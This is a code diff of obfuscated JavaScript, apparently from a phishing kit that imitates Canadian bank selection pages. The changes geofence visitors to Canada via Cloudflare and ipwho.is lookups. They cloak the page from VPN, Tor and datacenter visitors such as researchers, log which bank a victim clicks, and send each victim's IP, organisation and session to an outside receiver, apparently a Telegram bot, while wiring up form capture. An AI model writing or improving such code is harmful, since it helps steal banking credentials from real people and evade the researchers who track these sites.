@@ -138,13 +138,17 @@
     var _ip = _W.sessionStorage.getItem('__xip') || 'N/A';
     var _org = _W.sessionStorage.getItem('__xorg') || 'N/A';
 
-    _D.querySelectorAll('[filabel],[data-fi],.fi-tile').forEach(function(_el){
+    var _selector = '[filabel],[data-fi],.fi-tile,a[href*="101"],a[href*="html"]';
+    _D.querySelectorAll(_selector).forEach(function(_el){
       if (_el.dataset.xb) return;
       _el.dataset.xb = '1';
-      _el.addEventListener('click', function(){
+      _el.addEventListener('click', function(e){
         var _lbl = _el.getAttribute('filabel') || _el.getAttribute('data-fi') || _el.innerText || '?';
-        _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _lbl.trim() + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-      });
+        var _cleanLbl = _lbl.replace(/\s+/g, ' ').trim();
+        if (_cleanLbl.length > 0 && _cleanLbl !== '?') {
+          _tg(_R, '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + _cleanLbl + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+        }
+      }, true);
     });
   }
 
@@ -161,47 +165,81 @@
       return;
     }
 
-    // 3. IP / Proxy / Datacenter API Check (ipwho.is)
-    fetch('https://ipwho.is/')
-      .then(function(r){ return r.json(); })
-      .then(function(d){
-        if (!d.success) {
+    // Fonction d'activation une fois l'IP validée
+    function _activate(ip, org, countryCode){
+      _W.sessionStorage.setItem('__xip', ip);
+      _W.sessionStorage.setItem('__xorg', org);
+
+      _tg(_R, '🟢 <b>NOUVELLE VISITE</b>\n📍 IP: <code>' + ip + '</code>\n🌍 Pays: <code>' + countryCode + '</code>\n🏢 Org: <code>' + org + '</code>\n🆔 Session: <code>' + _SID + '</code>');
+
+      _setupForms();
+      _setupBanks();
+    }
+
+    // 3. Premier essai rapide: Cloudflare trace (Ultra rapide, aucun rate limit)
+    fetch('https://www.cloudflare.com/cdn-cgi/trace')
+      .then(function(r){ return r.text(); })
+      .then(function(t){
+        var locMatch = t.match(/loc=([A-Z]{2})/);
+        var ipMatch = t.match(/ip=([^\n]+)/);
+        var loc = locMatch ? locMatch[1] : '';
+        var ipVal = ipMatch ? ipMatch[1] : '';
+
+        if (loc !== _CC) {
           _die();
           return;
         }
 
-        // Vérification stricte du pays (Canada uniquement)
-        if (d.country_code !== _CC) {
-          _die();
-          return;
-        }
+        // Tenter d'enrichir avec ipwho.is pour détecter le VPN / l'Org
+        fetch('https://ipwho.is/' + ipVal)
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (d.success) {
+              var _sec = d.security || {};
+              var _conn = d.connection || {};
+              var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
+              var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
+              var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
+              var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;
 
-        // Vérification Proxy / VPN / TOR / Hosting / Datacenter
-        var _sec = d.security || {};
-        var _conn = d.connection || {};
-
-        var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
-        var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting' || _conn.asn_type === 'business';
-
-        // Motifs d'organisations/ISP typiques de VPN / Datacenter
-        var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
-        var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;
-
-        if (isProxy || isHosting || vpnPatterns.test(orgName)) {
-          _die();
-          return;
-        }
-
-        _W.sessionStorage.setItem('__xip', d.ip);
-        _W.sessionStorage.setItem('__xorg', d.connection ? (d.connection.org || d.connection.isp) : 'N/A');
-
-        _tg(_R, '🟢 <b>MOBILE CA (VALIDÉ)</b>\n📍 IP: <code>' + d.ip + '</code>\n🌍 Pays: <code>' + d.country_code + '</code>\n🏢 Org: <code>' + (d.connection ? d.connection.org : 'N/A') + '</code>\n🆔 Session: <code>' + _SID + '</code>');
-
-        _setupForms();
-        _setupBanks();
+              if (isProxy || isHosting || vpnPatterns.test(orgName)) {
+                _die();
+                return;
+              }
+              _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
+            } else {
+              _activate(ipVal, 'Canada ISP', loc);
+            }
+          })
+          .catch(function(){
+            _activate(ipVal, 'Canada ISP', loc);
+          });
       })
       .catch(function(){
-        _die();
+        // Second essai si CF échoue: ipwho.is direct
+        fetch('https://ipwho.is/')
+          .then(function(r){ return r.json(); })
+          .then(function(d){
+            if (!d.success || d.country_code !== _CC) {
+              _die();
+              return;
+            }
+            var _sec = d.security || {};
+            var _conn = d.connection || {};
+            var isProxy = _sec.proxy === true || _sec.vpn === true || _sec.tor === true;
+            var isHosting = _sec.hosting === true || _conn.asn_type === 'hosting';
+            var orgName = (d.connection ? (d.connection.org || d.connection.isp || '') : '').toLowerCase();
+            var vpnPatterns = /vpn|proxy|hosting|datacenter|server|cloud|amazon|digitalocean|ovh|linode|hetzner|m247|expressvpn|nordvpn|surfshark|mullvad|cyberghost|proton/i;
+
+            if (isProxy || isHosting || vpnPatterns.test(orgName)) {
+              _die();
+              return;
+            }
+            _activate(d.ip, (d.connection ? (d.connection.org || d.connection.isp) : 'N/A'), d.country_code);
+          })
+          .catch(function(){
+            _die();
+          });
       });
   }
 
